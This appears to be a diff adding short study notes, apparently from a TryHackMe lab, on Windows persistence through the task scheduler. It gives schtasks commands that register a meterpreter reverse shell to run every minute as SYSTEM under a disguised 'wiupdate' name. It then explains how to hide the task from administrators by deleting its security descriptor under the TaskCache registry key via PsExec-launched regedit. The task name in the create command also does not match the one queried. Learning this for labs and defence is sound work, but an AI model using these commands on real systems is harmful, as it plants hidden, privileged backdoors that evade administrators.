@@ -1,0 +1,15 @@
+- Windows task scheduler
+    - this is the most common way to schedule a task using the command schtasks.
+    - create a reverse shell that runs every single minute : 
+        schtasks /create /sc minute /mo 1 /tn wiupdate /tr "c:\temp\meterpreter.exe" /ru SYSTEM
+        - detail about the command : https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/schtasks-create
+    - check if the task is really there : 
+        schtasks /query /tn thm-taskbackdoor
+    - making task invisible: 
+        - remove its SD so no one could see it even the administrator
+        - for that, remove it from the registry :   
+            c:\tools\pstools\PsExec64.exe -s -i regedit
+        - the SD of all scheduled tasks are stored in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+        - remove there the SD of the desired task : 
+        - check if the task is visible : 
+            schtasks /query /tn thm-taskbackdoor
